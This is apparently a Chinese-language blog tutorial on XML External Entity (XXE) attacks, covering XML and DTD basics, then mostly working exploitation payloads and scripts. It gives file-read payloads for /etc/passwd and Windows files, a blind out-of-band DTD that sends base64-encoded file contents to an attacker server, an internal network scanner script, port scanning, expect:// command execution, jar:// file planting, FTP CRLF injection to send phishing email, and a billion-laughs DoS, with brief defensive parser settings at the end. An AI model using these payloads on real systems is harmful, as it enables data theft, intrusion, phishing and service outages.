
### 1、什么是XXE

普通的XML注入

![](https://ask.qcloudimg.com/http-save/yehe-8581257/56afb5ba987cbc8387f4098fab0659f6.png)

XML外部实体（XML External Entity, XXE）

- Web应用的脚本代码没有限制XML引入外部实体，从而导致测试者可以创建一个包含外部实体的XML，使得其中的内容会被[服务器](https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065)端执行
- 当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害

### 2、基础知识

XML，一种非常流行的标记语言

- 用于标记电子文件使其具有结构性的标记语言，可用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言
- 设计用来进行数据的传输和存储， 结构是树形结构，有标签构成
- 用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…）
- XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素 其中文档类型定义（DTD）可以是内部声明也可以引用外部DTD
- 在DTD中对实体（即用于定义引用普通文本或特殊字符的快捷方式的变量）声明时，既可在内部进行，也可在外部进行。
    - 内部声明实体格式：<!ENTITY 实体名称"实体的值">
    - 引用外部实体格式：<!ENTITY 实体名称SYSTEM"URI">

![](https://ask.qcloudimg.com/http-save/yehe-8581257/54f21654b2b6fbd6c67c57eebf1bc63e.png)

##### （1）xml文档的构建模块

所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：

- 元素
- 属性
- 实体
- PCDATA
- CDATA

1，元素 元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的 实例:

```javascript
<body>body text in between</body>
<message>some message in between</message>
```

复制

空的 HTML 元素的例子是 “hr”、“br” 以及 “img”

2，属性 属性可提供有关元素的额外信息 实例：

```javascript
<img src="computer.gif" />
```

复制

3，实体 实体是用来定义普通文本的变量 实体引用是对实体的引用

4，PCDATA PCDATA 的意思是被解析的字符数据（parsed character data） PCDATA 是会被解析器解析的文本，这些文本将被解析器检查实体以及标记

5，CDATA CDATA 的意思是字符数据（character data） CDATA 是不会被解析器解析的文本

##### （2）DTD(文档类型定义)

DTD（文档类型定义）

- 定义 XML 文档的合法构建模块
- DTD 可以在 XML 文档内声明，也可以外部引用

1，内部声明：`<!DOCTYPE 根元素 [元素声明]>` ex: `<!DOCTYOE test any>` 实例

```javascript
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>

```

复制

2，外部声明（引用外部DTD）：`<!DOCTYPE 根元素 SYSTEM "文件名">` ex:`<!DOCTYPE test SYSTEM 'http://www.test.com/evil.dtd'>` 实例

```javascript
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 

```

复制

note.dtd的内容为:

```javascript
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>

```

复制

##### （3）DTD实体

DTD实体

- 用于定义引用普通文本或特殊字符的快捷方式的变量
- 分为内部实体和外部实体
- 也可分为一般实体和参数实体

1，内部实体 ex:`<!ENTITY eviltest "eviltest">` 实例

```javascript
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
]>

<test>&writer;&copyright;</test>
```

复制

2，外部实体

- 从外部的 DTD文件中引用
- 对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）

实例

```javascript
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>

```

复制

3、一般实体

- 引用实体的方式：`&实体名`
- 在DTD 中定义，在 XML 文档中引用

实例

```javascript
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ... 
</updateProfile>

```

复制

4、参数实体

- 引用实体的方式： `% 实体名`(这里面空格不能少)
- 在 DTD 中定义，并且只能在 DTD 中使用 `% 实体名`引用
- 只有在 DTD 文件中，参数实体的声明才能引用其他实体
- 和通用实体一样，参数实体也可以外部引用
- 在 Blind XXE 中起到了至关重要的作用

实例

```javascript
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;

```

复制

### 3、XXE漏洞利用

##### （1）有回显读取敏感信息

有问题的xml.php

```javascript
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;
?>

```

复制

1、直接通过DTD外部实体声明

payload:

```javascript
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
<creds>&goodies;</creds>
```

复制

```javascript
声明引入外部实体声明
```

复制

想调取test.txt

![](https://ask.qcloudimg.com/http-save/yehe-8581257/37accd924cf592536f6824e4f62db9e3.png)

若直接通过DTD外部实体声明会报错 要用到CDATA和参数实体

payload:

```javascript
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; ]> 

<roottag>&all;</roottag>
```

复制

evil.dtd

```javascript
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

复制

##### （2）无回显读取敏感文件(Blind OOB XXE)

在某些情况下，即便服务器可能存在XXE，也不会向攻击者的浏览器或代理返回任何响应 遇到这种情况，我们可以使用Blind XXE漏洞来构建一条外带数据(OOB)通道来读取数据

有问题的xml.php

```javascript
<?php

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

复制

test.dtd

```javascript
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'>">
```

复制

payload：

- %remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来
- 然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)
- 再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上

```javascript
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>

```

复制

![](https://ask.qcloudimg.com/http-save/yehe-8581257/311933150c46bf702bdff45bcbdd16a2.png)

![](https://ask.qcloudimg.com/http-save/yehe-8581257/ffae731dd92c1675acd09c1a16b917fa.png)

在各个平台能用的协议

![](https://ask.qcloudimg.com/http-save/yehe-8581257/0666158cbca71fe714dd32dbdaa0c4df.png)

其中PHP在安装扩展后还能支持以下这些协议

![](https://ask.qcloudimg.com/http-save/yehe-8581257/f6f71e13b16483189852c5b6056e1969.png)

##### （3）HTTP 内网主机探测

以存在 XXE 漏洞的服务器为我们探测内网的支点

准备工作

- 先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子
- 可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件

一个脚本

```javascript
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
    xml = xml + "\r\n" + """<xml>"""
    xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
    xml = xml + "\r\n" + """</xml>"""
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
```

复制

##### （4）HTTP 内网主机端口扫描

可以使用http URI并强制服务器向我们指定的端点和端口发送GET请求，将XXE转换为SSRF 以下代码将尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启

```javascript
<?xml version="1.0"?>
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >]>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2020-11-11</date>
      <description>&xxe;</description>
   </core>
</catalog>
```

复制

可以将请求的端口作为 参数 然后利用 burp 的 intruder 来帮我们探测

##### （5）远程代码执行（RCE）

PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上 就可以执行如下的命令：

```javascript
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <author>John, Doe</author>
      <title>I love XML</title>
      <category>Computers</category>
      <price>9.99</price>
      <date>2020-11-11</date>
      <description>&xxe;</description>
   </core>
</catalog>
```

复制

##### （6）文件上传

Java 中有一个比较神奇的协议 jar:// 能从远程获取 jar 文件，然后将其中的内容进行解压

- 下载 jar/zip 文件到临时文件中
- 提取出我们指定的文件
- 删除临时文件

```javascript
jar:{url}!{path}
jar:http://host/application.jar!/file/within/the/zip

这个 ! 后面就是其需要从中解压出的文件
```

复制

先在本地模拟一个存在 XXE 的程序

xml_test.java

```javascript
package xml_test;
import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Attr;
import org.w3c.dom.Comment;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

/
 * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上
 * @author zhanglong
 *
 */
public class xml_test
{
    public static void main(String[] args) throws Exception
    {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();

        Document doc = db.parse(new File("student.xml"));
        //获得根元素结点
        Element root = doc.getDocumentElement();

        parseElement(root);
    }

    private static void parseElement(Element element)
    {
        String tagName = element.getNodeName();

        NodeList children = element.getChildNodes();

        System.out.print("<" + tagName);

        //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断
        NamedNodeMap map = element.getAttributes();

        //如果该元素存在属性
        if(null != map)
        {
            for(int i = 0; i < map.getLength(); i++)
            {
                //获得该元素的每一个属性
                Attr attr = (Attr)map.item(i);

                String attrName = attr.getName();
                String attrValue = attr.getValue();

                System.out.print(" " + attrName + "=\"" + attrValue + "\"");
            }
        }

        System.out.print(">");

        for(int i = 0; i < children.getLength(); i++)
        {
            Node node = children.item(i);
            //获得结点的类型
            short nodeType = node.getNodeType();

            if(nodeType == Node.ELEMENT_NODE)
            {
                //是元素，继续递归
                parseElement((Element)node);
            }
            else if(nodeType == Node.TEXT_NODE)
            {
                //递归出口
                System.out.print(node.getNodeValue());
            }
            else if(nodeType == Node.COMMENT_NODE)
            {
                System.out.print("<!--");

                Comment comment = (Comment)node;

                //注释内容
                String data = comment.getData();

                System.out.print(data);

                System.out.print("-->");
            }
        }

        System.out.print("</" + tagName + ">");
    }
}
package xml_test;
import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Attr;
import org.w3c.dom.Comment;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

/
 * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上
 * @author zhanglong
 *
 */
public class xml_test
{
    public static void main(String[] args) throws Exception
    {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();

        Document doc = db.parse(new File("student.xml"));
        //获得根元素结点
        Element root = doc.getDocumentElement();

        parseElement(root);
    }

    private static void parseElement(Element element)
    {
        String tagName = element.getNodeName();

        NodeList children = element.getChildNodes();

        System.out.print("<" + tagName);

        //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断
        NamedNodeMap map = element.getAttributes();

        //如果该元素存在属性
        if(null != map)
        {
            for(int i = 0; i < map.getLength(); i++)
            {
                //获得该元素的每一个属性
                Attr attr = (Attr)map.item(i);

                String attrName = attr.getName();
                String attrValue = attr.getValue();

                System.out.print(" " + attrName + "=\"" + attrValue + "\"");
            }
        }

        System.out.print(">");

        for(int i = 0; i < children.getLength(); i++)
        {
            Node node = children.item(i);
            //获得结点的类型
            short nodeType = node.getNodeType();

            if(nodeType == Node.ELEMENT_NODE)
            {
                //是元素，继续递归
                parseElement((Element)node);
            }
            else if(nodeType == Node.TEXT_NODE)
            {
                //递归出口
                System.out.print(node.getNodeValue());
            }
            else if(nodeType == Node.COMMENT_NODE)
            {
                System.out.print("<!--");

                Comment comment = (Comment)node;

                //注释内容
                String data = comment.getData();

                System.out.print(data);

                System.out.print("-->");
            }
        }

        System.out.print("</" + tagName + ">");
    }
}
```

复制

建立一个 xml 文件

test.xml

```javascript
<!DOCTYPE convert [ 
<!ENTITY  remote SYSTEM "jar:http://localhost:9999/jar.zip!/wm.php">
]>
<convert>&remote;</convert>

```

复制

9999 端口上放一个用 python 写 TCP 服务器

sever.py

```javascript
import sys 
import time 
import threading 
import socketserver 
from urllib.parse import quote 
import http.client as httpc 

listen_host = 'localhost' 
listen_port = 9999 
jar_file = sys.argv[1]

class JarRequestHandler(socketserver.BaseRequestHandler):  
    def handle(self):
        http_req = b''
        print('New connection:',self.client_address)
        while b'\r\n\r\n' not in http_req:
            try:
                http_req += self.request.recv(4096)
                print('Client req:\r\n',http_req.decode())
                jf = open(jar_file, 'rb')
                contents = jf.read()
                headers = ('''HTTP/1.0 200 OK\r\n'''
                '''Content-Type: application/java-archive\r\n\r\n''')
                self.request.sendall(headers.encode('ascii'))

                self.request.sendall(contents[:-1])
                time.sleep(30)
                print(30)
                self.request.sendall(contents[-1:])

            except Exception as e:
                print ("get error at:"+str(e))


if __name__ == '__main__':

    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
    print ('waiting for connection...') 
    server_thread = threading.Thread(target=jarserver.serve_forever) 
    server_thread.daemon = True 
    server_thread.start() 
    server_thread.join()
```

复制

通过报错找到临时文件的路径 然后可以操作了

可以参考一道 LCTF 2018 的 ctf题

##### （7）钓鱼

如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人

Java支持在sun.net.ftp.impl.FtpClient中的ftp URI 因此，我们可以指定用户名和密码，例如ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令

但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令

示例代码：

```javascript
ftp://a%0D%0A
EHLO%20a%0D%0A
MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
DATA%0D%0A
From%3A%20support%40VULNERABLESYSTEM.com%0A
To%3A%20victim%40gmail.com%0A
Subject%3A%20test%0A
%0A
test!%0A
%0D%0A
.%0D%0A
QUIT%0D%0A
:a@VULNERABLESYSTEM.com:25
```

复制

当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：

示例代码：

```javascript
ftp://a
EHLO a
MAIL FROM: <support@VULNERABLESYSTEM.com>
RCPT TO: <victim@gmail.com>
DATA
From: support@VULNERABLESYSTEM.com
To: victim@gmail.com
Subject: Reset your password
We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
.
QUIT
:support@VULNERABLESYSTEM.com:25

```

复制

这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件

##### （8）DOS 攻击

示例代码：

```javascript


<?xml version="1.0"?>
     <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
     ]>
     <lolz>&lol9;</lolz>
```

复制

### 4、现实场景

XXE经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用

##### 原始请求和响应

HTTP Request:

```javascript
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/json
Content-Length: 38

{"search":"name","value":"netspitest"}
```

复制

HTTP Response:

```javascript
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 43

{"error": "no results for name netspitest"}
```

复制

##### 进一步请求和响应

现在我们尝试将 Content-Type 修改为 application/xml HTTP Request:

```javascript
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 38

{"search":"name","value":"netspitest"}
```

复制

HTTP Response:

```javascript
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Content-Length: 127

{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}
```

复制

##### 最终的请求和响应

可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击

HTTP Request:

```javascript
POST /netspi HTTP/1.1
Host: someserver.netspi.com
Accept: application/json
Content-Type: application/xml
Content-Length: 288

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```

复制

HTTP Response:

```javascript
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 2467

{"error": "no results for name root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync....
```

复制

### 5、防御措施

主要是使用语言中推荐的禁用外部实体的方法

##### PHP

```javascript
libxml_disable_entity_loader(true);
```

复制

##### JAVA

```javascript
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);

.setFeature("http://xml.org/sax/features/external-general-entities",false)

.setFeature("http://xml.org/sax/features/external-parameter-entities",false);
```

复制

##### Python

```javascript
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

复制

## burpsuite 利用

监听页面后，右键 -> send to repeater

#### 基础利用

将原始报文：
```
POST /process.php HTTP/1.1
Host: hackerkid.blackhat.local
Content-Length: 129
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://hackerkid.blackhat.local
Referer: http://hackerkid.blackhat.local/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?><root><name>admin</name><tel>123</tel><email>test</email><password>123456</password></root>

```
中的xml部分：
```
<?xml version="1.0" encoding="UTF-8"?><root><name>admin</name><tel>123</tel><email>test</email><password>123456</password></root>
```
修改为：
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root><name>admin</name><tel>123</tel><email>&test;</email><password>123456</password></root>
```
也就是在其中注入：

```
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>

配合这句中的test，将其中一个参数修改为：&test; 
```

#### base64绕过利用

```
<!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/home/saket/.bashrc'>]>
```
将得到密文，解码后得到明文

